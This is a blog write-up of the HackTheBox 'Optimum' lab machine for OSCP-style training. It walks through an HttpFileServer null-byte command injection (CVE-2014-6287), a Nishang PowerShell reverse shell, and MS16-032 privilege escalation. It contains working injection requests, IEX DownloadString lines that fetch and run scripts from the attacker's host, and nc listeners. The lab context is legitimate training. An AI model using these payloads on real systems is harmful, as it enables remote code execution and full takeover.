2019-05-06-Optimum-hackthebox.md
---
published: true
---
Disassembly of ippsec’s youtube video HackTheBox - Optimum. Windows box completed two different ways with and without Metasploit. Focusing on the usage of Powershell, enumerating the privesc with Sherlock and executing an exploit with a shell from Nishang and Empire.


----------

Legal Usage:
*The information provided by execute@will is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risks/responsibilities.*

----------


![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1556968527410_image.png)


This series of write-up will contain comprehensive write-ups of hackthebox machines. In an effort to sharpen reporting techniques and help solidify the understand and methodologies used during penetration testing.


# Enumeration

nmap scan:

    nmap -sC -sV -oA nmap 10.10.10.8

(results)

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1556968925516_image.png)


*initially just looking at a web-server on port 80.*


## navigating to web-server

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1556969021105_image.png)

Worth testing the login feature with standard logins: admin/admin

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1556969072461_image.png)

Setting up a hydra on the back-end to brute force while continuing enumerating is not a bad idea. 

Gained information: Application HttpFileServer 2.3D

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1556969254503_image.png)

Switching to an incognito window as the login is somehow adding a cookie thus making continued enumeration difficult. While incognito mode wouldn’t allow this.

## google search HttpFileServer Exploit

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1556969308977_image.png)

*Rapid7 CVE-2014-6287 Remote Code Execution exploit looking promising.*


## investigating CVE

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1556969386668_image.png)

*The exploit works by taking advantage of the* `*findMacroMaker*` *function in* `*parserLib.pas*` *and allows for remote attackers to execute arbitrary programs via %00 null byte sequence in a search action.*

## HttpFileServer webapp
by sending a scripted function into the search we should be able to pass commands to the server.

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1556970078094_image.png)

*there is a script that replaces the* `*{ } . |*` *on the application is where the vulnerability exists. By sending a %00 null byte we are telling the application end of string and terminates the regular expression and from that point afterward is injectable.*

## HFS scripting commands 
Link: http://www.rejetto.com/wiki/index.php/HFS:_scripting_commands
(page needs to be opened as cached)

Command of interest:

    exec | A

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557120934354_image.png)

    example: {.exec|notepad.}

## Inject exec with Burp
Turn Burp on and capture a request:

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557121045075_image.png)

captured request and send to repeater (ctrl+r)

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557121092329_image.png)

*%00 null byte is captured in the GET “?search=” request.*

Next we add `/?search=%00{.exec|ping 10.10.14.17` and setup tcpdump to capture the ICMP request.

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557121292019_image.png)

## RCE
tcpdump setup:

    tcpdump -i tun0

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557121325320_image.png)

*successfully captured an ICMP and at this point we have Remote Code Execution (RCE).*

# RCE to Reverse Shell (Nishang)
At this point since we have remote code execution via the `exec` we can now setup a reverse shell using Nishang.

Nishang Github Link: https://github.com/samratashok/nishang

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557121581020_image.png)

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557121608302_image.png)

    cd Shells

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557121638175_image.png)

*use the* `*Invoke-PowerShellTcp.ps1*`

copy `*Invoke-PowerShellTcp.ps1*` to working directory

    cp Invoke-PowerShellTcp.ps1 ~/Documents/htb/boxes/optimum

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557121772690_image.png)

## Configure Invoke-PowerShellTcp.ps1
Checking out the powershell script:

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557121819503_image.png)

The example shows the syntax we wnat to use:

    Invoke-PowerShellTcp -Reverse -IPAddress [ipv6 address] -Port 4444

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557121900630_image.png)

*copy that go to the bottom of the script and paste and change to target:*

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557122335441_image.png)

## setup listener
    nc -lvnp 1337

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557122389243_image.png)

## SimpleHTTPServer setup
    python -m SimpleHTTPServer

*in directory of the .ps1 that we will upload to the sever*

## Windows 32bit / 64bit directories
    C:\Windows\System32\ # 32bit
    C:\Windows\SysWow64\ # still 32bit
    C:\Windows\SysNative\ # 64bit
## Burp exec to download ps1
Inside Burp send the following command to have the target download our newly crafted ps1 file.


    GET /?search=%00{.exec| c:\Windows\SysNative\WindowsPowershell\v.1.0\powershell.exe ping 10.10.14.17 #ctrl+u to unicode encode / ctrl+shift+u to decode

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557123128792_image.png)

Listen on tcpdump

    tcpdump -i tun0

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557123170507_image.png)

*confirmed connection*

Sending ps1 payload:

    GET /?search=%00{.exec| c:\Windows\SysNative\WindowsPowershell\v.1.0\powershell.exe IEX(New-ObjectNet.WebClient).downloadString('http://10.10.14.17:8000/Invoke-PowerShellTcp.ps1'),)

Url encode with ctrl+u:

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557123411635_image.png)

Target executes the download:

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557123485214_image.png)

*executed x4 times but after execution on the 1337 listener we get a response:*

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557123534147_image.png)

# Priv-Esc (windows)

First step:

    systeminfo 

*gets all the info on the box to include the hotfixes*

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557123638486_image.png)

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557123610860_image.png)

*2012 R2 Standard*
Boot times

## use/edit Sherlock to enumerate KBs

copy Sherlock to directory

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557123762188_image.png)

Sherlock Github Link: https://github.com/rasta-mouse/Sherlock

Grep for functions within sherlock:

    grep -i function Sherlock.ps1

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557123812432_image.png)

*we are going to want to edit the script to “Find-AllVulns” and add line to bottom.*

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557123885173_image.png)

*save.*

Target InvokedShell Download Sherlock:

    IEX(New-Object Net.Webclient).downloadString('http://10.10.14.17:8000/Sherlock.ps1')

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557124020093_image.png)

(returns)

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557124061009_image.png)

*MS16-032 : Appears Vulnerable*
*MS16-135 : Appears Vulnerable*

*if you were to search all the KBs on the target system you would see it was last patched in 2016.*

## google “Vulnerable” exploits
search for exploits:

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557124198808_image.png)

*first result happens to be metasploit.*

search “MS16-032 powershell”

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557126828793_image.png)

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557126841621_image.png)


*good proof of concept if we had an interactive shell with gui. Luckily, EMPIRE does have exploit.*

    /Empire/data/module_source/privesc

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557126958124_image.png)

*viewing “Invoke-MS16032.ps1”*

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557127016535_image.png)

example:

    Invoke-MS16032 -Command "iex(New-Object.WebClient).DownloadString('http://google.com')"

*There was a mistake with the example as it included a “-” where the filename doesn’t. Corrected in above example.*

at very bottom of script copy/paste command:

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557127303043_image.png)

*get rid of “-”, change google to localip with “shell.ps1” and save.*

Copy “Invoke-PowershellTcp.ps1” to “Shell.ps1”

    cp Invoke-PowershellTcp.ps1 Shell.ps1

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557127462708_image.png)

edit to port 1338

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557127505315_image.png)

setup listener for port 1338

    nc -lvnp 1338

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557127590571_image.png)

Target nc session download Invoke-MS16032.ps1

    IEX(New-Object.WebClient).DownloadString('http://10.10.14.17:8000/Invoke-MS16032.ps1')

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557127884986_image.png)

download it our webserver:

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557127926038_image.png)

(returns)

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557127993789_image.png)

# Root&Loot
on port “1338” the Shell.ps1 is loaded

![](https://paper-attachments.dropbox.com/s_63B976EF832897276D24CB4C8AB02A5780DEC6EE03C0771814D9D3FDB835DB6D_1557128064712_image.png)

*NT Authority\System level access!*

He continues onward to explain how to perform the same exploit with metasploit. Seeing as the OSCP exam only allow for one usage of metasploit we’ll leave this “Disassembled” at this point.

----------

If you don’t know who IppSec is check him out at:
Youtube: https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
 
Twitter: https://twitter.com/ippsec

